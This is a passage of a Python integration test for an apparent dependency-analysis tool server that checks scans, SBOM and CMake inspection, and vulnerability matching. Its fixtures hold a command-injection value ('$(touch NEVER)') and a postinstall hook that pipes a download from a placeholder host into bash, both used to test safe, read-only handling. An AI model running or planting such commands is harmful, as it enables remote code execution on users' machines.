            )
            passed.append("read-only-tool-contracts")

            frontend = await call("scan_repository", "frontend")
            check(
                frontend["capabilities"]["dependency_hygiene"]["state"] == "complete",
                "Literal Astro/CSS evidence remained unsupported",
            )
            font = await call("explain_dependency", "frontend", package="font")
            check(
                font["usages"][0]["reference"] == "font/style.css"
                and font["usages"][0]["mapping_confidence"] == "exact"
                and font["usages"][0]["location"]
                == {"path": "Page.astro", "line": 2, "column": 8},
                "Astro import lost package mapping",
            )
            theme = await call("dependency_impact", "frontend", package="theme")
            check(
                theme["usage_count"] == 1 and theme["files"] == ["global.css"],
                "CSS impact lost its source",
            )
            passed.append("literal-astro-css-evidence")
            (root / "frontend" / "Page.astro").write_text(
                fixtures["frontend"]["Page.astro"] + "<div>{import(name)}</div>\n"
            )
            check(
                (await call("repository_context", "frontend"))["stale"],
                "Astro changes did not invalidate cached evidence",
            )
            frontend_partial = await call("scan_repository", "frontend")
            check(
                frontend_partial["capabilities"]["dependency_hygiene"]["state"]
                == "incomplete"
                and not any(
                    f["code"] == "dependency.unused"
                    for f in frontend_partial["findings"]
                )
                and any(
                    d["code"] == "usage.unsupported-astro-syntax"
                    for d in frontend_partial["diagnostics"]
                ),
                "Unparsed Astro expressions established an unused dependency",
            )
            passed.append("astro-uncertainty-and-refresh")

            uncertain = await call("scan_repository", "frontend-uncertain")
            explanation = await call(
                "explain_dependency", "frontend-uncertain", package="theme"
            )
            check(
                uncertain["capabilities"]["dependency_hygiene"]["state"] == "incomplete"
                and any(
                    d["code"] == "usage.unsupported-css-scope"
                    for d in uncertain["diagnostics"]
                )
                and not any(
                    f["code"] == "dependency.scope-mismatch"
                    for f in uncertain["findings"]
                )
                and explanation["usages"][0]["scope"] == "unknown"
                and not explanation["usage_complete"],
                "CSS imports without a build context established runtime scope",
            )
            passed.append("css-scope-uncertainty")

            locks = await call("scan_repository", "lock-ambiguous")
            locked = await call("explain_dependency", "lock-ambiguous", package="tool")
            check(
                locks["capabilities"]["dependency_hygiene"]["state"] == "incomplete"
                and "resolution.package-manager-ambiguous"
                in locks["context"]["incomplete_reasons"]
                and locked["resolved_versions"] == []
                and not locked["evidence_complete"],
                "Conflicting lockfiles supplied an unqualified resolved graph",
            )
            passed.append("ambiguous-lock-graphs")

            await call("index_repository", "pages")
            names = []
            offset = 0
            while True:
                page = await call(
                    "query_dependencies", "pages", limit=20, offset=offset
                )
                names.extend(item["package"] for item in page["dependencies"])
                if not page["truncated"]:
                    check(page["next_offset"] is None, "Unexpected next page")
                    break
                check(page["next_offset"] > offset, "Pagination did not advance")
                offset = page["next_offset"]
            check(
                names == [f"package-{i:03d}" for i in range(65)],
                "Missing/duplicate packages",
            )
            passed.append("complete-paginated-inventory")

            await call("index_repository", "ambiguous")
            ambiguous = await call("explain_dependency", "ambiguous", package="shared")
            check(
                ambiguous["error"]["code"] == "dependency.ambiguous", "Lost ambiguity"
            )
            chosen = next(
                item
                for item in ambiguous["error"]["choices"]
                if item["project_id"] == "npm:npm:two"
            )
            qualified = await call(
                "explain_dependency",
                "ambiguous",
                **{key: chosen[key] for key in ("project_id", "ecosystem", "package")},
            )
            check(qualified["project_id"] == "npm:npm:two", "Wrong project selected")
            passed.append("qualified-ambiguous-identity")

            preview = await call(
                "plan_dependency_updates", "preview", updates={"requests": "2.32.4"}
            )
            check(preview["plans"] == [], "Unsupported preview produced a plan")
            check(
                preview["diagnostics"][0]["code"] == "update.unsupported-target",
                "Missing unsupported-target diagnostic",
            )
            check(
                (root / "preview" / "pyproject.toml").read_text()
                == fixtures["preview"]["pyproject.toml"],
                "Preview changed the manifest",
            )
            passed.append("unsupported-preview-is-not-noop")
            explicit = await call(
                "plan_dependency_updates",
                "preview",
                updates={"requests": "2.32.4"},
                target_file="pyproject.toml",
                group="project",
            )
            check(explicit["plans"][0]["groups"] == ["project"], "Wrong explicit group")
            check(
                "2.32.4" in explicit["plans"][0]["preview"], "Missing pyproject preview"
            )
            passed.append("explicit-pyproject-preview")
            explicit_noop = await call(
                "plan_dependency_updates",
                "preview",
                updates={"requests": "2.31.0"},
                target_file="pyproject.toml",
                group="project",
            )
            check(
                not explicit_noop["plans"] and not explicit_noop["diagnostics"],
                "Pyproject noop failed",
            )
            passed.append("explicit-pyproject-noop")
            for folder, code in [
                ("preview-ambiguous", "update.ambiguous-target"),
                ("preview-url", "update.unsupported-target"),
            ]:
                rejected = await call(
                    "plan_dependency_updates",
                    folder,
                    updates={"requests": "2"},
                    target_file="pyproject.toml",
                )
                check(
                    not rejected["plans"]
                    and rejected["diagnostics"][0]["code"] == code,
                    "Incorrect pyproject rejection",
                )
                passed.append(folder)
            for folder in ("preview", "preview-ambiguous", "preview-url"):
                check(
                    (root / folder / "pyproject.toml").read_bytes()
                    == fixtures[folder]["pyproject.toml"].encode(),
                    "Pyproject preview wrote target",
                )

            noop = await call(
                "plan_dependency_updates", "python", updates={"requests": "2.31.0"}
            )
            check(
                not noop["plans"] and not noop["diagnostics"],
                "No-op treated as failure",
            )
            passed.append("supported-preview-noop")

            await call("scan_repository", "tool")
            tool = await call("explain_dependency", "tool", package="ruff")
            check(not tool["findings"], "Tool use reported as unused")
            check(
                not tool["imports"] and not tool["imported"],
                "Tool use became an import",
            )
            check(
                tool["usages"][0]["kind"] == "tool"
                and tool["usages"][0]["mapping_confidence"] == "configured"
                and tool["usages"][0]["mapping_reason"] == "CI lint",
                "Tool explanation lost configured provenance",
            )
            passed.append("configured-tool-usage")

            await call("scan_repository", "command")
            command = await call(
                "explain_dependency", "command", package="vitest", ecosystem="npm"
            )
            check(
                command["imports"] == [] and command["usages"][0]["kind"] == "command",
                "Static command was reported as a source import",
            )
            check(
                command["usages"][0]["mapping_confidence"] == "exact",
                "Command mapping lost provenance",
            )
            command_impact = await call(
                "dependency_impact", "command", package="vitest", ecosystem="npm"
            )
            check(
                command_impact["usage_count"] == 1, "Impact omitted static command use"
            )
            passed.append("static-command-provenance")

            cpp_scan = await call("scan_repository", "cpp-preprocessor")
            check(
                not any(
                    f["code"] in {"dependency.missing", "dependency.scope-mismatch"}
                    for f in cpp_scan["findings"]
                ),
                "C/C++ comment or conditional include became a hygiene finding",
            )
            cpp = await call(
                "explain_dependency",
                "cpp-preprocessor",
                package="gtest",
                ecosystem="Conan",
            )
            check(
                len(cpp["usages"]) == 1
                and cpp["usages"][0]["kind"] == "conditional"
                and cpp["usages"][0]["mapping_confidence"] == "inferred"
                and cpp["usages"][0]["location"]["line"] == 5
                and cpp["usages"][0]["location"]["column"] == 3
                and not cpp["usage_complete"],
                "Conditional C/C++ include lost its position or unknown activation",
            )
            cpp_impact = await call(
                "dependency_impact",
                "cpp-preprocessor",
                package="gtest",
                ecosystem="Conan",
            )
            check(
                cpp_impact["usage_count"] == 1 and not cpp_impact["evidence_complete"],
                "C/C++ impact lost conditional evidence or claimed completeness",
            )
            passed.append("cpp-preprocessor-evidence-is-qualified")

            cargo_scan = await call("scan_repository", "cargo")
            check(
                not cargo_scan["context"]["complete"],
                "Cargo usage was treated as complete",
            )
            cargo = await call(
                "explain_dependency",
                "cargo",
                package="foo",
                ecosystem="Cargo",
                project_id="cargo:cargo:.",
            )
            check(
                cargo["resolved_versions"] == ["1.2.3"]
                and not cargo["usage_complete"]
                and len(cargo["usages"]) == 1
                and cargo["usages"][0]["mapping_confidence"] == "inferred"
                and cargo["usages"][0]["scope"] == "unknown",
                "Cargo inventory lost its usage qualification",
            )
            cargo_impact = await call(
                "dependency_impact", "cargo", package="foo", ecosystem="Cargo"
            )
            check(
                cargo_impact["usage_count"] == 1
                and not cargo_impact["evidence_complete"],
                "Cargo impact inferred source non-use",
            )
            passed.append("cargo-inventory-and-rust-references-are-qualified")

            cargo_legacy_scan = await call("scan_repository", "cargo-legacy")
            cargo_legacy = await call(
                "explain_dependency",
                "cargo-legacy",
                package="foo",
                ecosystem="Cargo",
                project_id="cargo:cargo:.",
            )
            cargo_rejected = await call(
                "explain_dependency",
                "cargo-legacy",
                package="bar",
                ecosystem="Cargo",
                project_id="cargo:cargo:new",
            )
            check(
                cargo_legacy_scan["inventory"]["declaration_count"] == 4
                and [d["kind"] for d in cargo_legacy["declarations"]]
                == ["direct", "configuration"]
                and cargo_legacy["declarations"][1]["metadata"]["legacy_section"][
                    "status"
                ]
                == "ignored"
                and cargo_rejected["declarations"][0]["metadata"]["legacy_section"][
                    "status"
                ]
                == "rejected"
                and not cargo_rejected["evidence_complete"]
                and any(
                    d["code"] == "manifest.cargo-legacy-section"
                    for d in cargo_legacy_scan["diagnostics"]
                ),
                "Cargo legacy aliases lost precedence/edition qualification in indexed queries",
            )
            passed.append("cargo-legacy-sections-preserve-edition-and-precedence")

            cmake = await call("scan_repository", "cmake")
            check(
                not cmake["context"]["complete"],
                "CMake activation was treated as complete",
            )
            cmake_record = await call(
                "explain_dependency",
                "cmake",
                package="googletest",
                ecosystem="CMake",
                project_id="cmake:cmake:.",
            )
            check(
                cmake_record["purl"] is None
                and cmake_record["resolved_versions"] == [],
                "CMake source assertions became package-manager coordinates or installed versions",
            )
            check(
                cmake_record["declarations"][0]["location"]["path"] == "deps.cmake"
                and cmake_record["declarations"][0]["metadata"]["activation"]
                == "unknown"
                and cmake_record["usages"][0]["kind"] == "configuration",
                "CMake declaration position or configuration provenance was lost",
            )
            cmake_impact = await call(
                "dependency_impact", "cmake", package="googletest", ecosystem="CMake"
            )
            check(
                not cmake_impact["evidence_complete"],
                "CMake impact inferred complete source usage",
            )
            passed.append("cmake-configuration-inventory-is-qualified")

            script = await call("scan_repository", "cmake-script")
            check(
                any(
                    d["code"] == "manifest.unsupported-cmake-command"
                    for d in script["diagnostics"]
                ),
                "Uncollected CPM calls disappeared from script coverage",
            )
            check(
                {p["project_id"] for p in script["context"]["projects"]}
                == {"cmake:cmake-script:.", "cmake:cmake:app"}
                and not script["context"]["complete"],
                "CMake script scope absorbed a project or reported complete coverage",
            )
            ambiguous = await call(
                "explain_dependency",
                "cmake-script",
                package="SHARED",
                ecosystem="CMake",
            )
            check(
                ambiguous["error"]["code"] == "dependency.ambiguous",
                "CMake component ambiguity was lost",
            )
            script_record = await call(
                "explain_dependency",
                "cmake-script",
                package="SHARED",
                ecosystem="CMake",
                project_id="cmake:cmake-script:.",
            )
            check(
                script_record["declarations"][0]["location"]["path"] == "fetch.cmake"
                and script_record["resolved_versions"] == []
                and script_record["purl"] is None,
                "Script explanation lost ownership or guessed a package identity",
            )
            script_impact = await call(
                "dependency_impact",
                "cmake-script",
                package="SHARED",
                ecosystem="CMake",
                project_id="cmake:cmake-script:.",
            )
            check(
                not script_impact["evidence_complete"],
                "Script impact inferred complete source usage",
            )
            passed.append("cmake-script-scope-is-qualified")

            private = await call("scan_repository", "pipenv-private")
            check(
                not private["context"]["complete"],
                "Private Pipenv identity was treated as verified",
            )
            private_record = await call(
                "explain_dependency",
                "pipenv-private",
                package="requests",
                ecosystem="PyPI",
            )
            check(
                private_record["purl"] is None
                and private_record["resolved_versions"] == ["2.31.0"]
                and private_record["declarations"][0]["location"]["line"] == 7
                and private_record["declarations"][0]["metadata"]["origin"]["public"]
                is False,
                "Pipenv declaration lost its position, static pin or unverified origin",
            )
            private_impact = await call(
                "dependency_impact",
                "pipenv-private",
                package="requests",
                ecosystem="PyPI",
            )
            check(
                not private_impact["evidence_complete"],
                "Private source identity became complete impact evidence",
            )
            passed.append("pipenv-private-source-and-position-preserved")

            conan = await call("scan_repository", "conan-contexts")
            check(
                not conan["context"]["complete"],
                "Conan lock inventory became an active graph",
            )
            conan_record = await call(
                "explain_dependency", "conan-contexts", package="fmt", ecosystem="Conan"
            )
            resolutions = conan_record["resolutions"]
            check(
                len(resolutions) == 3
                and len({r["instance"] for r in resolutions}) == 3
                and {r["origin"]["context"] for r in resolutions}
                == {"requires", "build_requires"}
                and all(r["origin"]["activation"] == "unknown" for r in resolutions)
                and {
                    r["location"]["line"]
                    for r in resolutions
                    if r["origin"]["context"] == "requires"
                }
                == {4, 5},
                "Conan lock instances, contexts or positions were lost",
            )
            conan_impact = await call(
                "dependency_impact", "conan-contexts", package="fmt", ecosystem="Conan"
            )
            check(
                not conan_impact["evidence_complete"],
                "Conan impact inferred an active build",
            )
            passed.append("conan-lock-contexts-and-activation-qualified")

            vcpkg = await call("scan_repository", "vcpkg-registry")
            check(
                not vcpkg["context"]["complete"],
                "vcpkg registry lock became package resolution",
            )
            vcpkg_record = await call(
                "explain_dependency", "vcpkg-registry", package="fmt", ecosystem="vcpkg"
            )
            declaration = vcpkg_record["declarations"][0]
            check(
                not vcpkg_record["resolved_versions"]
                and declaration["location"]["line"] == 2
                and declaration["marker"] == "windows"
                and declaration["metadata"]["minimum_version"] == "10.0"
                and declaration["metadata"]["features"]
                == [{"name": "unicode", "platform": "linux"}],
                "vcpkg conditions or minimum version changed meaning",
            )
            vcpkg_impact = await call(
                "dependency_impact", "vcpkg-registry", package="fmt", ecosystem="vcpkg"
            )
            check(
                not vcpkg_impact["evidence_complete"],
                "vcpkg impact inferred active features",
            )
            passed.append("vcpkg-registry-lock-and-feature-activation-qualified")
            conditional = await call(
                "explain_dependency",
                "vcpkg-registry",
                package="gtest",
                ecosystem="vcpkg",
            )
            assertion = conditional["declarations"][0]
            check(
                assertion["kind"] == "conditional"
                and len(conditional["declarations"]) == 2
                and {d["metadata"]["feature"] for d in conditional["declarations"]}
                == {"tests", "debugging"}
                and assertion["metadata"]["feature"] == "tests"
                and assertion["metadata"]["activation"] == "unknown"
                and assertion["metadata"]["default_feature_assertions"]
                == [{"name": "tests", "platform": "windows"}]
                and conditional["resolved_versions"] == []
                and not conditional["findings"],
                "Feature declaration became an active direct dependency or hygiene advice",
            )
            conditional_impact = await call(
                "dependency_impact",
                "vcpkg-registry",
                package="gtest",
                ecosystem="vcpkg",
            )
            check(
                conditional_impact["usage_count"] == 0
                and not conditional_impact["evidence_complete"],
                "Zero observed feature usage became removal evidence",
            )
            passed.append("vcpkg-feature-inventory-is-conditional")
            maven = await call("scan_repository", "maven-plugin")
            check(
                not maven["context"]["complete"],
                "Plugin configuration became a complete build graph",
            )
            plugin = await call(
                "explain_dependency",
                "maven-plugin",
                package="org.apache.maven.plugins:maven-compiler-plugin",
                ecosystem="Maven",
            )
            check(
                len(plugin["declarations"]) == 2
                and {d["metadata"]["maven_kind"] for d in plugin["declarations"]}
                == {"build-plugin", "plugin-management"}
                and all(
                    d["kind"] == "conditional" and d["scope"] == "build"
                    for d in plugin["declarations"]
                )
                and plugin["resolved_versions"] == []
                and not plugin["findings"],
                "Plugin management/configuration was promoted to installed application dependencies",
            )
            plugin_impact = await call(
                "dependency_impact",
                "maven-plugin",
                package="org.apache.maven.plugins:maven-compiler-plugin",
                ecosystem="Maven",
            )
            check(
                plugin_impact["usage_count"] == 0
                and not plugin_impact["evidence_complete"],
                "Zero Java imports became plugin removal evidence",
            )
            passed.append("maven-plugin-configuration-is-not-execution")

            uncovered = await call("scan_repository", "uncovered")
            check(
                not uncovered["context"]["complete"]
                and bool(uncovered["context"]["coverage"]["uncovered"]),
                "An unsupported repository was reported complete",
            )
            passed.append("uncovered-manifest-context")

            components = await call("scan_repository", "components")
            check(
                not components["context"]["complete"]
                and any(
                    d["code"] == "analysis.python-component-scope-ambiguous"
                    for d in components["diagnostics"]
                ),
                "Disjoint Python components borrowed declarations",
            )
            component = await call("scan_repository", "components/a")
            check(
                any(f["code"] == "dependency.missing" for f in component["findings"]),
                "Component-root scan lost missing dependency evidence",
            )
            passed.append("python-component-root-boundary")

            (root / "python" / "requirements.txt").write_text("requests==2.32.4\n")
            stale = await call("repository_context", "python")
            check(stale["stale"], "Manifest edit did not stale the index")
            refreshed = await call("scan_repository", "python")
            check(not refreshed["context"]["stale"], "Scan did not refresh the index")
            passed.append("refresh-after-manifest-change")

            snapshots = root / "python/.tmp"
            snapshots.mkdir()
            (snapshots / "before.json").write_text(json.dumps(scan))
            (snapshots / "after.json").write_text(json.dumps(refreshed))
            compared = await call(
                "compare_dependency_snapshots",
                "python",
                before_file=".tmp/before.json",
                after_file=".tmp/after.json",
            )
            check(
                compared["comparable"] and compared["counts"]["resolved_added"] == 1,
                "Snapshot comparison lost qualified version changes",
            )
            check(
                compared["capabilities"]["security"]["state"] == "incomplete"
                and not compared["remediation_verified"],
                "Offline comparison claimed remediation",
            )
            passed.append("qualified-read-only-snapshot-comparison")

            (snapshots / "bom.json").write_text(
                json.dumps(
                    {
                        "bomFormat": "CycloneDX",
                        "specVersion": "1.7",
                        "metadata": {
                            "component": {"bom-ref": "app", "name": "application"}
                        },
                        "components": [
                            {
                                "bom-ref": "lock",
                                "name": "package-lock.json",
                                "type": "application",
                                "properties": [
                                    {
                                        "name": "aquasecurity:trivy:Class",
                                        "value": "lang-pkgs",
                                    },
                                    {"name": "aquasecurity:trivy:Type", "value": "npm"},
                                ],
                            },
                            *[
                                {
                                    "bom-ref": f"package-{i}",
                                    "name": f"package-{i}",
                                    "purl": f"pkg:npm/package-{i}@1.0.0",
                                    "licenses": [{"license": {"id": "MIT"}}],
                                    "properties": [
                                        {
                                            "name": "source:path",
                                            "value": "package-lock.json",
                                        }
                                    ],
                                }
                                for i in range(2)
                            ],
                        ],
                        "dependencies": [
                            {"ref": "app", "dependsOn": ["lock"]},
                            {"ref": "lock", "dependsOn": ["package-0", "package-1"]},
                        ],
                    }
                )
            )
            sbom_original = (snapshots / "bom.json").read_bytes()
            index_original = (root / "python/.depcheck/index.sqlite3").read_bytes()
            sbom = await call(
                "inspect_dependency_sbom", "python", sbom_file=".tmp/bom.json", limit=2
            )
            check(
                sbom["total"] == 3 and sbom["next_offset"] == 2,
                "SBOM pagination failed",
            )
            final_page = await call(
                "inspect_dependency_sbom",
                "python",
                sbom_file=".tmp/bom.json",
                offset=2,
                limit=2,
            )
            check(
                len(final_page["components"]) == 1
                and final_page["next_offset"] is None,
                "SBOM final page incorrect",
            )
            check(
                sbom["capabilities"]["usage"]["state"] == "unsupported"
                and sbom["capabilities"]["security"]["state"] == "skipped",
                "SBOM invented source/security evidence",
            )
            passed.append("external-sbom-provenance-and-pagination")
            group, package = sbom["components"]
            check(
                group["kind"] == "dependency-group"
                and group["direct"] is None
                and package["dependency_groups"] == ["lock"]
                and package["direct"] is None
                and package["licenses"] == [{"license": {"id": "MIT"}}]
                and package["properties"]
                == [{"name": "source:path", "value": "package-lock.json"}]
                and sbom["capabilities"]["inventory"]["state"] == "complete",
                "SBOM grouping or reported license/source evidence was lost",
            )
            check(
                (snapshots / "bom.json").read_bytes() == sbom_original
                and (root / "python/.depcheck/index.sqlite3").read_bytes()
                == index_original,
                "SBOM inspection changed source or the index",
            )
            passed.append("external-sbom-groups-and-license-assertions")

            cmake_reply = snapshots / "cmake-reply"
            cmake_reply.mkdir()
            cmake_version = {"major": 2, "minor": 9}
            cmake_bodies = {
                "index-selected.json": {
                    "objects": [
                        {
                            "kind": "codemodel",
                            "version": cmake_version,
                            "jsonFile": "model.json",
                        }
                    ]
                },
                "model.json": {
                    "kind": "codemodel",
                    "version": cmake_version,
                    "paths": {"source": "/recorded", "build": "/recorded/build"},
                    "configurations": [
                        {
                            "name": "Debug",
                            "targets": [
                                {"id": "app::id", "name": "app", "jsonFile": "app.json"}
                            ],
                            "abstractTargets": [
                                {
                                    "id": "vendor::id",
                                    "name": "Vendor::lib",
                                    "jsonFile": "vendor.json",
                                }
                            ],
                        }
                    ],
                },
                "app.json": {
                    "id": "app::id",
                    "name": "app",
                    "type": "EXECUTABLE",
                    "paths": {"source": ".", "build": "."},
                    "codemodelVersion": cmake_version,
                    "linkLibraries": [{"id": "vendor::id"}],
                    "link": {
                        "commandFragments": [
                            {"role": "flags", "fragment": "$(touch NEVER)"}
                        ]
                    },
                },
                "vendor.json": {
                    "id": "vendor::id",
                    "name": "Vendor::lib",
                    "type": "INTERFACE_LIBRARY",
                    "paths": {"source": "/foreign", "build": "/foreign"},
                    "codemodelVersion": cmake_version,
                    "abstract": True,
                    "imported": True,
                },
            }
            for name, value in cmake_bodies.items():
                (cmake_reply / name).write_text(json.dumps(value))
            cmake_before = {
                path: (path.read_bytes(), path.stat().st_mtime_ns)
                for path in cmake_reply.iterdir()
            }
            cmake_rows = {
                key: [] for key in ("targets", "relationships", "input_files")
            }
            offset = 0
            while True:
                cmake = await call(
                    "inspect_cmake_model",
                    "python",
                    index_file=".tmp/cmake-reply/index-selected.json",
                    limit=1,
                    offset=offset,
                )
                check(
                    cmake["import_complete"] and not cmake["evidence_complete"],
                    "CMake model completeness was overstated",
                )
                check(
                    cmake["coverage"]["security"] == "skipped"
                    and cmake["coverage"]["source_freshness"] == "unknown",
                    "CMake assertions became verified source/security evidence",
                )
                for key, values in cmake_rows.items():
                    values.extend(cmake[key])
                if cmake["next_offset"] is None:
                    break
                offset = cmake["next_offset"]
            check(
                len(cmake_rows["targets"]) == 2
                and cmake_rows["targets"][1]["imported"]
                and cmake_rows["targets"][1]["abstract"],
                "CMake abstract/imported target identity was lost",
            )
            check(
                cmake_rows["relationships"][0]["kind"] == "linkLibraries"
                and cmake_rows["relationships"][0]["target_present"],
                "CMake direct linking was confused with build ordering",
            )
            check(
                len(cmake_rows["input_files"]) == 4,
                "CMake input-file pagination lost provenance",
            )
            check(
                all(
                    (path.read_bytes(), path.stat().st_mtime_ns) == state
                    for path, state in cmake_before.items()
                )
                and (root / "python/.depcheck/index.sqlite3").read_bytes()
                == index_original
                and not (root / "python/NEVER").exists(),
                "CMake inspection changed source/cache or executed a command",
            )
            passed.append(
                "external-cmake-model-qualified-linking-pagination-and-read-only-boundary"
            )

            # New external evidence remains independent of the source index.
            (snapshots / "offline-osv.json").write_text(
                json.dumps(
                    {
                        "schema": "depcheck.osv-database.v1",
                        "records": [
                            {
                                "id": "OSV-OFFLINE",
                                "modified": "2026-10-18T00:00:00Z",
                                "affected": [
                                    {
                                        "package": {
                                            "name": "package-0",
                                            "ecosystem": "npm",
                                        },
                                        "ranges": [
                                            {
                                                "type": "SEMVER",
                                                "events": [
                                                    {"introduced": "0"},
                                                    {"fixed": "2.0.0"},
                                                ],
                                            }
                                        ],
                                    }
                                ],
                            }
                        ],
                    }
                )
            )
            offline = await call(
                "reevaluate_vulnerabilities",
                "python",
                inventory_file=".tmp/bom.json",
                advisory_file=".tmp/offline-osv.json",
            )
            check(
                offline["observations"][0]["status"] == "matched"
                and offline["global_vulnerability_coverage"] == "unknown",
                "Offline corpus matching overstated coverage",
            )
            passed.append("offline-osv-supplied-inventory-scope")
            (snapshots / "normalized-bom.json").write_text(
                json.dumps(
                    {
                        "bomFormat": "CycloneDX",
                        "specVersion": "1.7",
                        "components": [
                            {
                                "bom-ref": "demo",
                                "name": "demo",
                                "purl": "pkg:pypi/demo@1.0.0",
                            }
                        ],
                    }
                )
            )
            (snapshots / "normalized-osv.json").write_text(
                json.dumps(
                    {
                        "id": "OSV-NORMALIZED",
                        "modified": "2026-10-18T00:00:00Z",
                        "affected": [
                            {
                                "package": {"ecosystem": "PyPI", "name": "demo"},
                                "versions": ["1.0"],
                            },
                            {
                                "ranges": [
                                    {
                                        "type": "GIT",
                                        "repo": "https://example.test/source",
                                        "events": [{"introduced": "abc"}],
                                    }
                                ]
                            },
                        ],
                    }
                )
            )
            normalized_osv = await call(
                "reevaluate_vulnerabilities",
                "python",
                inventory_file=".tmp/normalized-bom.json",
                advisory_file=".tmp/normalized-osv.json",
            )
            normalized_row = normalized_osv["observations"][0]
            check(
                normalized_row["status"] == "matched"
                and normalized_row["vulnerabilities"][0]["fix_version"] is None
                and "normalized" in normalized_row["advisory_checks"][0]["reason"]
                and normalized_osv["database"]["unmapped_affected_entries"] == 1,
                "OSV membership was tied to fix availability, or Git assertions lost",
            )
            passed.append("offline-osv-normalized-membership-without-forward-fix")
            (snapshots / "vex.json").write_text(
                json.dumps(
                    {
                        "@context": "https://openvex.dev/ns/v0.2.0",
                        "@id": "urn:example:vex",
                        "author": "fixture",
                        "timestamp": "2026-10-18T00:00:00Z",
                        "version": 1,
                        "statements": [
                            {
                                "vulnerability": {"name": "OSV-OFFLINE"},
                                "products": [{"@id": "pkg:npm/package-0@1.0.0"}],
                                "status": "under_investigation",
                            }
                        ],
                    }
                )
            )
            vex = await call(
                "inspect_evidence", "python", evidence_file=".tmp/vex.json", kind="vex"
            )
            check(
                vex["records"][0]["status"] == "under_investigation"
                and vex["finding_effect"] == "none",
                "VEX asserted a trusted decision",
            )
            passed.append("external-vex-status-and-no-suppression")
            (snapshots / "calls.py").write_text(
                "def target():\n    pass\ndef main():\n    alias = target\n    alias()\n"
            )
            (snapshots / "calls.json").write_text(
                json.dumps(
                    {
                        "schema": "depcheck.python-call-analysis.v1",
                        "sources": [{"path": ".tmp/calls.py", "module": "consumer"}],
                        "entries": ["consumer:main"],
                        "vulnerability_symbols": [
                            {"advisory_id": "EXTERNAL", "node_id": "consumer:target"}
                        ],
                    }
                )
            )
            calls_result = await call(
                "analyze_python_calls", "python", analysis_file=".tmp/calls.json"
            )
            check(
                calls_result["tables"]["assessments"][0]["path"]
                == ["consumer:main", "consumer:target"]
                and calls_result["metadata"]["coverage"]["state"] == "incomplete",
                "Static callable path/qualification lost",
            )
            passed.append("selected-python-callable-path-and-limits")
            exported = await call(
                "export_evidence",
                "python",
                snapshot_file=".tmp/before.json",
                kind="provenance",
                input_files=[".tmp/calls.py"],
            )
            check(
                exported["predicate"]["signature_status"] == "unsigned",
                "Unsigned evidence became authenticated",
            )
            passed.append("unsigned-explicit-provenance-export")
            cross = await call(
                "compare_inventories",
                "python",
                before_file=".tmp/bom.json",
                after_file=".tmp/bom.json",
            )
            check(
                cross["total"] == 0 and cross["false_positive_rate"] is None,
                "Inventory comparison invented correctness rates",
            )
            passed.append("cross-producer-inventory-comparison-profile")
            (snapshots / "package-old.json").write_text('{"scripts":{}}')
            (snapshots / "package-new.json").write_text(
                '{"scripts":{"postinstall":"curl https://example.test | bash"}}'
            )
            behavior = await call(
                "compare_package_behavior",
                "python",
                before_file=".tmp/package-old.json",
                after_file=".tmp/package-new.json",
            )
            check(
                behavior["changes"][0]["after"]["lifecycle"]
                and behavior["maliciousness"] == "not-established",
                "Script capability became maliciousness claim",
            )
            names = await call(
                "compare_package_names",
                "python",
                package="requsets",
                references=["requests"],
                ecosystem="PyPI",
            )
            check(
                names["signals"][0]["mechanism"] == "adjacent-transposition"
                and not names["automatic_replacement"],
                "Name signal changed identity",
            )
            passed.append("package-behavior-and-name-advisories")
            denied = await session.call_tool(
                "verify_registry_package",
                {
                    "project_root": str(root / "python"),
                    "ecosystem": "PyPI",
                    "package": "requests",
                },
            )
            check(
                bool(denied.isError), "Registry lookup accepted missing network opt-in"
            )
            calls.append(
                {
                    "name": "verify_registry_package",
                    "arguments": {"allow_network": False},
                    "expected_error": True,
                }
            )
            check(
                (root / "python/.depcheck/index.sqlite3").read_bytes()
                == index_original,
                "External evidence modified the index",
            )
            passed.append("registry-network-opt-in-and-external-read-only-cache")

            (snapshots / "qualified-bom.json").write_text(
                json.dumps(
                    {
                        "bomFormat": "CycloneDX",
                        "specVersion": "1.7",
                        "components": [
                            {
                                "bom-ref": "private",
                                "name": "tool",
                                "purl": "pkg:npm/%40Scope/LegacyTool@1?repository_url=https%3A%2F%2Fprivate.example#src",
                            }
                        ],
                    }
                )
            )
            qualified_original = (snapshots / "qualified-bom.json").read_bytes()
            qualified = await call(
                "inspect_dependency_sbom",
                "python",
                sbom_file=".tmp/qualified-bom.json",
            )
            identity = qualified["components"][0]["identity"]
            check(
                identity["package"] == "@Scope/LegacyTool"
                and identity["qualifiers"]
                == {"repository_url": "https://private.example"}
                and identity["subpath"] == "src"
                and qualified["capabilities"]["inventory"]["state"] == "incomplete"
                and qualified["capabilities"]["security"]["state"] == "skipped"
                and any(
                    d["code"] == "sbom.identity-qualified"
                    for d in qualified["diagnostics"]
                ),
                "SBOM lost qualified identity or claimed an unverified resolution",
            )
            check(
                (snapshots / "qualified-bom.json").read_bytes() == qualified_original
                and (root / "python/.depcheck/index.sqlite3").read_bytes()
                == index_original,
                "Qualified SBOM inspection changed source or the index",
            )
            passed.append("external-sbom-preserves-purl-identity-dimensions")

            (snapshots / "bad-bom.json").write_text(
                json.dumps(
                    {
                        "bomFormat": "CycloneDX",
                        "specVersion": "1.7",
                        "metadata": {"component": {"bom-ref": "same", "name": "app"}},
                        "components": [{"bom-ref": "same", "name": "library"}],
                    }
                )
            )
            invalid_arguments = {
                "project_root": str(root / "python"),
                "sbom_file": ".tmp/bad-bom.json",
            }
            rejected = await session.call_tool(
                "inspect_dependency_sbom", invalid_arguments
            )
            check(
                rejected.isError is True
                and "application reference" in rejected.content[0].text,
                "Invalid SBOM application identity was accepted",
            )
            calls.append(
                {
                    "name": "inspect_dependency_sbom",
                    "arguments": invalid_arguments,
                    "result": {"is_error": True, "message": rejected.content[0].text},
                }
            )
            passed.append("external-sbom-rejects-conflicting-identity")

            await call("scan_repository", "configuration")
            configured = await call(
                "explain_dependency",
                "configuration",
                package="@types/node",
                ecosystem="npm",
            )
            check(
                not configured["imports"]
                and configured["usages"][0]["kind"] == "configuration",
                "TypeScript configuration became a source import",
            )
            passed.append("static-configuration-provenance")

            named = await call("scan_repository", "named-components")
            check(
                {p["project_id"] for p in named["projects"]}
                == {"pypi:python:a", "pypi:python:b"},
                "Named Python ownership was lost",
            )
            named_cache = root / "named-components/.depcheck/index.sqlite3"
            named_before = named_cache.read_bytes()
            legacy_config = root / "named-components/.depcheck.toml"
            legacy_config.write_text(
                '[[tool-usage]]\necosystem="PyPI"\nproject-id="pypi:python:."\n'
                'package="pyyaml"\nscope="test"\nreason="Legacy plugin configuration"\n'
            )
            invalid_arguments = {"project_root": str(root / "named-components")}
